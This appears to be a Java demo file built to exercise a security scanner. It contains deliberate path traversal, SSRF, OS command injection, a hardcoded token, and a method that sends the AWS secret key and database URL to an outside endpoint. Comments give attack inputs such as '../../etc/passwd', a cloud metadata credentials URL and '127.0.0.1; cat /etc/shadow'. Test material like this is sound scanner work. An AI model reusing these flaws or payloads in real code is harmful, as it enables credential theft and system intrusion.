package com.demo;

import java.io.*;
import java.net.*;

/**
 * DEMO FILE — intentional vulnerabilities for security scanner showcase.
 *
 * CWE findings  : CWE-22 (Path Traversal), CWE-78 (OS Command Injection),
 *                 CWE-918 (SSRF)
 * Exfiltration  : taint — reads local sensitive files → external HTTP endpoint
 * Secrets       : hardcoded endpoint token embedded in source
 */
public class FileService {

    private static final String BASE_DIR        = "/var/app/files/";
    // SECRETS — bearer token for internal service hardcoded in source
    private static final String EXFIL_ENDPOINT  = "https://telemetry.corp-analytics.io/ingest";
    private static final String SERVICE_TOKEN   = "Bearer prod_svc_xK9mN2pL8qR5tW3vY7zA4cF6hJ1bM";

    // CWE FINDING — CWE-22: Path Traversal; filename not canonicalized
    // Attack: filename = "../../etc/passwd" reads arbitrary files
    public String readFile(String filename) throws IOException {
        File file = new File(BASE_DIR + filename);
        // Missing: file.getCanonicalPath().startsWith(BASE_DIR) check
        StringBuilder sb = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = reader.readLine()) != null) sb.append(line).append('\n');
        }
        return sb.toString();
    }

    // CWE FINDING — CWE-22: Path Traversal on write path
    public void writeFile(String filename, String content) throws IOException {
        File file = new File(BASE_DIR + filename);
        try (FileWriter fw = new FileWriter(file)) {
            fw.write(content);
        }
    }

    // EXFILTRATION — taint flow: local sensitive data → external endpoint
    // Source: local filesystem (profile.json, env vars with cloud credentials)
    // Sink  : EXFIL_ENDPOINT over cleartext HTTP POST
    public void syncUserData(String userId) throws IOException {
        String userData = readFile("users/" + userId + "/profile.json");
        String envData  = System.getProperty("user.home")
                        + "|" + System.getenv("AWS_SECRET_ACCESS_KEY")
                        + "|" + System.getenv("DATABASE_URL");

        URL url = new URL(EXFIL_ENDPOINT + "?uid=" + userId);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Authorization", SERVICE_TOKEN);
        conn.setDoOutput(true);
        try (OutputStream os = conn.getOutputStream()) {
            String payload = "data=" + URLEncoder.encode(userData, "UTF-8")
                           + "&env=" + URLEncoder.encode(envData, "UTF-8");
            os.write(payload.getBytes());
        }
        conn.getInputStream();  // Fire and forget
    }

    // CWE FINDING — CWE-918: SSRF; user supplies arbitrary URL including internal metadata endpoints
    // Attack: userUrl = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    public String fetchRemoteResource(String userUrl) throws IOException {
        URL url = new URL(userUrl);  // No allowlist or IP-range block
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(url.openStream()))) {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            return sb.toString();
        }
    }

    // CWE FINDING — CWE-78: OS Command Injection via Runtime.exec with shell=true equivalent
    // Attack: host = "127.0.0.1; cat /etc/shadow"
    public String runPing(String host) throws IOException {
        String cmd = "ping -c 4 " + host;
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        return new String(p.getInputStream().readAllBytes());
    }
}
